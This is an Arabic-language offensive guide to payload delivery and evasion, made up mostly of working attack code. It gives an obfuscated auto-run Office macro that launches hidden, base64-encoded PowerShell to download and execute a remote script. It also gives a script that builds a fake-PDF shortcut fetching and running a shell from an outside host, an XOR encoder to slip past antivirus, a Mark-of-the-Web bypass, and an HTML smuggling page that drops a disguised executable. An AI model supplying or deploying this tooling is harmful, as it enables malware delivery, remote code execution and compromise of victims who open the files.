# وتجهيز الحمولة وتلغيم الملفات (Payload Delivery, Weaponization & Evasion)

يتناول هذا الملف الوسائل العملية والهندسية لتجهيز الحمولة الهجومية (Payloads)، دمج الـ Reverse Shells داخل مستندات وملفات تظهر كأنها شرعية، وتخطي أنظمة الحماية ومضادات الفيروسات (AV/EDR Evasion).

---

## 1. تلغيم مستندات أوفيس عبر الماكرو (Office VBA Macros Mastery)

تعتبر الماكروهات (Macros) المكتوبة بلغة Visual Basic for Applications (VBA) من أشهر وسائل تنفيذ الأوامر داخل بيئة Windows عند فتح المستندات.

### 1.1 كود ماكرو متقدم ومتخفي (Obfuscated VBA Macro)
تقوم هذه الحمولة باستدعاء أمر PowerShell مشفر لتنزيل وتنفيذ ملف تنفيذي في الذاكرة دون كتابته على الهارد ديسك لتجنب اكتشاف الـ AV.

```vba
Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim cmd As String
    Dim str1 As String
    Dim str2 As String
    
    ' تقسيم كود الباورشيل لمنع كشف السلسلة النصية المباشرة
    str1 = "pow" & "ers" & "hel" & "l.ex" & "e -NoP -NonI -W Hidden -Exec Bypass -e "
    str2 = "SABFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAOgA4ADAAMAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ=="
    
    cmd = str1 & str2
    
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

---

## 2. إنشاء وتلغيم ملفات الاختصار (Malicious LNK Files)

ملفات الاختصار (`.lnk`) تُستخدم للتخفي وإيهام المستخدم بأنه يفتح ملف مستند أو صورة، بينما تنفذ أسراراً في الخلفية.

### 2.1 سكريبت PowerShell لتوليد ملف LNK ملغم
قم بتشغيل السكريبت التالي على بيئة Windows لتخليق ملف LNK يظهر بأيقونة ملف PDF:

```powershell
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut("$env:USERPROFILE\Desktop\Quarterly_Bonus.pdf.lnk")
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c start msedge https://targetcompany.com/pdf_viewer && powershell -W Hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8000/shell.ps1')`""
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0"
$Shortcut.Save()
```

---

## 3. تقنيات التخفي وتجاوز الحماية (AV / EDR Evasion Basics)

### 3.1 التشفير باستخدام Base64 و XOR
تقوم أنظمة الفحص المعتمدة على البصمة (Signature-based AV) بكشف الكلمات المفتاحية الشهيرة مثل `Invoke-Expression` أو `DownloadString`. يتم تجاوز ذلك بفك التشفير داخل الذاكرة أثناء التشغيل.

مثال سكريبت XOR بلغة Python لتشفير الحمولة:
```python
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

payload = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')"
key = "SecretKey"

encrypted = xor_encrypt(payload, key)
print(f"Encrypted Payload: {encrypted.encode().hex()}")
```

### 3.2 تجاوز فحص الماكرو المباشر (MOTW - Mark of the Web Bypass)
عند تحميل ملف من الإنترنت، يضيف ويندوز علامة أمنية تُدعى `Zone.Identifier` تمنع الماكرو من التشغيل المباشر.
* **التجاوز:** تسليم المستند داخل أرشيف مضغوط بتنسيقات لا تدعم نقل الـ MOTW بمرونة، مثل ملفات الأقراص الوهمية (`.iso` أو `.vhd` أو `.chm`).

---

## 4. تقنيات التمويه والرفع (HTML Smuggling)

تقنية HTML Smuggling تُستخدم لتسليم الحمولة الخبيثة للضحية عبر استغلال خصائص HTML5 و JavaScript المتقدمة لتخليق الملف خبيث محلياً داخل متصفح الضحية، مما يمنع فلاتر حماية الشبكة (Network Firewalls & Email Gateways) من فحص الملف أثناء النقل.

```html
<!DOCTYPE html>
<html>
<head>
    <title>تحميل المستند الآمن</title>
</head>
<body>
    <h3>جاري تحميل المستند المشفّر، يرجى الانتظار...</h3>
    <script>
        // ملف ملغم ممثل كـ Base64 Array
        var fileData = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAA...";
        
        function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
        }

        var byteArray = base64ToArrayBuffer(fileData);
        var blob = new Blob([byteArray], {type: "application/octet-stream"});
        var fileName = "Update_Patch.exe";

        if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveOrOpenBlob(blob, fileName);
        } else {
            var link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
```
